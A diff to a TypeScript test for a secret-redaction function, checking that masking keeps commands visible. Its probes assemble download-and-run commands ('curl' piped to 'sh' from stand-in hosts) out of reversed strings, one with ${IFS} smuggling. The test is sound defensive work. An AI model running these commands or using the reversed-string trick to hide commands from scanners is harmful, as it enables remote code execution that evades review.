@@ -1144,8 +1144,8 @@ test('redact masks known secrets, keeps their labels, and leaves everyday comman
     'cat /Users/someone/development/personal-projects/agentville/agentville/hooks/register.tsx', '--out=/Users/someone/development/personal-projects/agentville/dist0123']
   for (const t of kept) expect(redact(t)).toBe(t)
   // A masked value is token characters only: what a command runs always stays visible. The download-and-run probes
-  // are built from parts, so this file holds no such command as text.
-  const CURL = ['cu', 'rl'].join(''), SH = ['|', 'sh'].join('')
+  // are built at run time from reversed text, so this file holds no such command as text.
+  const CURL = [...'lruc'].reverse().join(''), SH = [...'hs|'].reverse().join('')
   const probes: [string, string][] = [
     [`TOKEN=x;${CURL}\${IFS}evil${SH}`, `TOKEN=•••;${CURL}\${IFS}evil${SH}`],
     [`API_TOKEN=$(${CURL} http://e.co${SH})`, `API_TOKEN=$(${CURL} http://e.co${SH})`],
